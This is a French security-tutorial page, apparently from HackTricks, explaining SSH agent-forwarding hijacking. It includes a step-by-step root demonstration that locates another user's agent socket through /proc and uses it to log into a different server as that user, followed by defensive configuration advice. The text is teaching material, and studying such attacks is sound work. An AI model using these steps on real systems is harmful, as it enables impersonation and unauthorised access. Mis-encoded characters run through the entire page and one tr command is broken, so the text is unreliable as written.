# R√©sum√©

Que pouvez-vous faire si vous d√©couvrez dans la configuration `/etc/ssh_config` ou dans la configuration `$HOME/.ssh/config` ceci :
```
ForwardAgent yes
```
Si vous √™tes root √† l'int√©rieur de la machine, vous pouvez probablement **acc√©der √† toute connexion ssh effectu√©e par n'importe quel agent** que vous pouvez trouver dans le r√©pertoire _/tmp_.

Faites-vous passer pour Bob en utilisant l'un des ssh-agent de Bob :
```bash
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
```
## Pourquoi cela fonctionne-t-il?

Lorsque vous d√©finissez la variable `SSH_AUTH_SOCK`, vous acc√©dez aux cl√©s de Bob qui ont √©t√© utilis√©es dans la connexion ssh de Bob. Ensuite, si sa cl√© priv√©e est toujours l√† (normalement, elle le sera), vous pourrez acc√©der √† n'importe quel h√¥te en l'utilisant.

Comme la cl√© priv√©e est enregistr√©e dans la m√©moire de l'agent non crypt√©e, je suppose que si vous √™tes Bob mais que vous ne connaissez pas le mot de passe de la cl√© priv√©e, vous pouvez toujours acc√©der √† l'agent et l'utiliser.

Une autre option est que l'utilisateur propri√©taire de l'agent et root peut acc√©der √† la m√©moire de l'agent et extraire la cl√© priv√©e.

# Explication longue et exploitation

**Extrait de:** [**https://www.clockwork.com/news/2012/09/28/602/ssh\_agent\_hijacking/**](https://www.clockwork.com/news/2012/09/28/602/ssh\_agent\_hijacking/)

## **Lorsque ForwardAgent ne peut pas √™tre fait confiance**

SSH sans mots de passe facilite grandement la vie avec les syst√®mes d'exploitation de type Unix. Si votre r√©seau n√©cessite des sessions ssh en cha√Æne (pour acc√©der √† un r√©seau restreint, par exemple), la redirection d'agent devient extr√™mement utile. Avec la redirection d'agent, il est possible pour moi de me connecter depuis mon ordinateur portable √† mon serveur de d√©veloppement et de l√†, ex√©cuter une v√©rification svn √† partir d'un autre serveur, le tout sans mots de passe, tout en gardant ma cl√© priv√©e en s√©curit√© sur mon poste de travail local.

Cependant, cela peut √™tre dangereux. Une recherche rapide sur le web r√©v√©lera plusieurs articles indiquant que cela n'est s√ªr que si les h√¥tes interm√©diaires sont dignes de confiance. Rarement, cependant, vous trouverez une explication de _pourquoi_ c'est dangereux.

C'est √† cela que sert cet article. Mais d'abord, un peu de contexte.

## **Comment fonctionne l'authentification sans mot de passe**

Lors de l'authentification en mode normal, SSH utilise votre mot de passe pour prouver que vous √™tes qui vous pr√©tendez √™tre. Le serveur compare un hachage de ce mot de passe √† celui qu'il a enregistr√©, v√©rifie que les hachages correspondent, et vous laisse entrer.

Si un attaquant est capable de casser le chiffrement utilis√© pour prot√©ger votre mot de passe pendant qu'il est envoy√© au serveur, il peut le voler et se connecter en tant que vous quand il le souhaite. Si un attaquant est autoris√© √† effectuer des centaines de milliers de tentatives, il peut finalement deviner votre mot de passe.

Une m√©thode d'authentification beaucoup plus s√ªre est l'authentification par cl√© publique, une fa√ßon de se connecter sans mot de passe. L'authentification par cl√© publique n√©cessite une paire de cl√©s publique et priv√©e assorties. La cl√© publique chiffre des messages qui ne peuvent √™tre d√©chiffr√©s qu'avec la cl√© priv√©e. L'ordinateur distant utilise sa copie de votre cl√© publique pour chiffrer un message secret pour vous. Vous prouvez que vous √™tes vous en d√©chiffrant le message √† l'aide de votre cl√© priv√©e et en renvoyant le message √† l'ordinateur distant. Votre cl√© priv√©e reste en s√©curit√© sur votre ordinateur local tout le temps, √† l'abri des attaques.

La cl√© priv√©e est pr√©cieuse et doit √™tre prot√©g√©e, donc par d√©faut elle est stock√©e dans un format crypt√©. Malheureusement, cela signifie entrer votre phrase de passe de chiffrement avant de l'utiliser. De nombreux articles sugg√®rent d'utiliser des cl√©s priv√©es sans phrase de passe (non crypt√©es) pour √©viter cette inconv√©nient. C'est une mauvaise id√©e, car quiconque a acc√®s √† votre poste de travail (par acc√®s physique, vol ou piratage) a maintenant √©galement un acc√®s gratuit √† tous les ordinateurs configur√©s avec votre cl√© publique.

OpenSSH inclut [ssh-agent](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-agent), un d√©mon qui s'ex√©cute sur votre poste de travail local. Il charge une copie d√©chiffr√©e de votre cl√© priv√©e en m√©moire, de sorte que vous n'avez √† entrer votre phrase de passe qu'une seule fois. Il fournit ensuite un [socket](http://en.wikipedia.org/wiki/Unix\_domain\_socket) local que le client ssh peut utiliser pour lui demander de d√©chiffrer le message crypt√© renvoy√© par le serveur distant. Votre cl√© priv√©e reste en s√©curit√© dans la m√©moire du processus ssh-agent tout en vous permettant de naviguer dans ssh sans taper de mots de passe.

## **Comment ForwardAgent fonctionne**

De nombreuses t√¢ches n√©cessitent des sessions ssh en cha√Æne. Consid√©rez mon exemple pr√©c√©dent : je me connecte en ssh depuis mon poste de travail vers le serveur de d√©veloppement. L√†-bas, je dois effectuer une mise √† jour svn, en utilisant le protocole "svn+ssh". Comme il serait stupide de laisser une copie non crypt√©e de ma cl√© priv√©e super-secr√®te sur un serveur partag√©, je suis maintenant bloqu√© avec l'authentification par mot de passe. Si, cependant, j'ai activ√© "ForwardAgent" dans la configuration ssh sur mon poste de travail, ssh utilise ses capacit√©s de tunnelisation int√©gr√©es pour cr√©er un autre socket sur le serveur de d√©veloppement qui est tunnelis√© de retour vers le socket ssh-agent sur mon poste de travail local. Cela signifie que le client ssh sur le serveur de d√©veloppement peut maintenant envoyer des demandes de "d√©chiffrer ce message secret" directement √† l'agent ssh en cours d'ex√©cution sur mon poste de travail, s'authentifiant aupr√®s du serveur svn sans jamais avoir acc√®s √† ma cl√© priv√©e.

## **Pourquoi cela peut √™tre dangereux**

En bref, toute personne disposant de privil√®ges root sur le serveur interm√©diaire peut utiliser gratuitement votre ssh-agent pour s'authentifier aupr√®s d'autres serveurs. Une d√©monstration simple montre √† quel point cela peut √™tre trivial. Les noms d'h√¥tes et d'utilisateurs ont √©t√© modifi√©s pour prot√©ger les innocents.

Mon ordinateur portable ex√©cute ssh-agent, qui communique avec les programmes clients ssh via un socket. Le chemin de ce socket est stock√© dans la variable d'environnement SSH_AUTH_SOCK:
```
mylaptop:~ env|grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/launch-oQKpeY/Listeners

mylaptop:~ ls -l /tmp/launch-oQKpeY/Listeners
srwx------  1 alice  wheel  0 Apr  3 11:04 /tmp/launch-oQKpeY/Listeners
```
Le programme [ssh-add](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-add) nous permet de visualiser et d'interagir avec les cl√©s dans l'agent :
```
mylaptop:~ alice$ ssh-add -l
2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)
```
J'ai "ForwardAgent yes" dans le fichier \~/.ssh/config sur mon ordinateur portable. Ainsi, ssh va cr√©er un tunnel reliant le socket local √† un socket local sur le serveur distant :
```
mylaptop:~ alice$ ssh seattle

seattle:~ $ env|grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-WsKcHa9990/agent.9990
```
M√™me si mes cl√©s ne sont pas install√©es sur "seattle", les programmes clients ssh peuvent toujours acc√©der √† l'agent en cours d'ex√©cution sur ma machine locale :
```
seattle:~ alice $ ssh-add -l
2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)
```
Alors... Avec qui pouvons-nous jouer ?
```
seattle:~ alice $ who
alice   pts/0        2012-04-06 18:24 (office.example.com)
bob     pts/1        2012-04-03 01:29 (office.example.com)
alice   pts/3        2012-04-06 18:31 (office.example.com)
alice   pts/5        2012-04-06 18:31 (office.example.com)
alice   pts/6        2012-04-06 18:33 (office.example.com)
charlie pts/23       2012-04-06 13:10 (office.example.com)
charlie pts/27       2012-04-03 12:32 (office.example.com)
bob     pts/29       2012-04-02 10:58 (office.example.com)
```
Je n'ai jamais aim√© Bob. Pour trouver sa connexion d'agent, je dois trouver le processus enfant d'une de ses sessions ssh :
```
seattle:~ alice $ sudo -s
[sudo] password for alice:

seattle:~ root # pstree -p bob
sshd(16816)‚îÄ‚îÄ‚îÄbash(16817)

sshd(25296)‚îÄ‚îÄ‚îÄbash(25297)‚îÄ‚îÄ‚îÄvim(14308)
```
Il existe plusieurs fa√ßons pour root de visualiser l'environnement d'un processus en cours d'ex√©cution. Sur Linux, les donn√©es sont disponibles dans /proc/\<pid>/environ. Comme elles sont stock√©es dans des cha√Ænes de caract√®res termin√©es par NULL, j'utiliserai tr pour convertir les NULL en sauts de ligne :
```
seattle:~ root # tr '' 'n' < /proc/16817/environ | grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816
```
J'ai maintenant tout ce dont j'ai besoin pour prendre le contr√¥le de l'agent ssh de Bob :
```
seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh-add -l
2048 05:f1:12:f2:e6:ad:cb:0b:60:e3:92:fa:c3:62:19:17 /home/bob/.ssh/id_rsa (RSA)
```
Si j'ai une cible sp√©cifique en t√™te, je devrais maintenant √™tre en mesure de me connecter directement. Sinon, simplement en regardant la liste des processus ou en cherchant dans l'historique de Bob devrait pr√©senter de nombreuses opportunit√©s de cibles. Dans ce cas, je sais que Bob a toutes sortes de fichiers super secrets stock√©s sur le serveur nomm√© "boston":
```
seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
bob@boston:~$ whoami
bob
```
J'ai r√©ussi √† utiliser mes privil√®ges root sur "Seattle" pour acc√©der en tant que Bob sur "Boston". Je parie que je peux l'utiliser pour le faire virer.

## **Prot√©gez-vous !**

Ne laissez pas votre ssh-agent stocker vos cl√©s ind√©finiment. Sur OS X, configurez votre trousseau de cl√©s pour se verrouiller apr√®s une p√©riode d'inactivit√© ou lorsque votre √©cran est verrouill√©. Sur d'autres plates-formes Unix, passez l'option -t √† ssh-agent afin que ses cl√©s soient supprim√©es apr√®s un certain nombre de secondes.

Ne pas activer la transmission d'agent lors de la connexion √† des h√¥tes non fiables. Heureusement, la syntaxe \~/.ssh/config rend cela assez simple :
```
Host trustworthyhost
  ForwardAgent yes
```

```
Host *
  ForwardAgent no
```
## **Lecture recommand√©e**

* [Gestion des cl√©s OpenSSH](http://www.ibm.com/developerworks/library/l-keyc/index.html) ‚Äì Daniel Robbins
* [Guide illustr√© de la redirection de l'agent SSH](http://www.unixwiz.net/techtips/ssh-agent-forwarding.html) ‚Äì Steve Friedl
* [Manuel ssh-agent](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-agent)
* [Manuel ssh-add](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-add)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
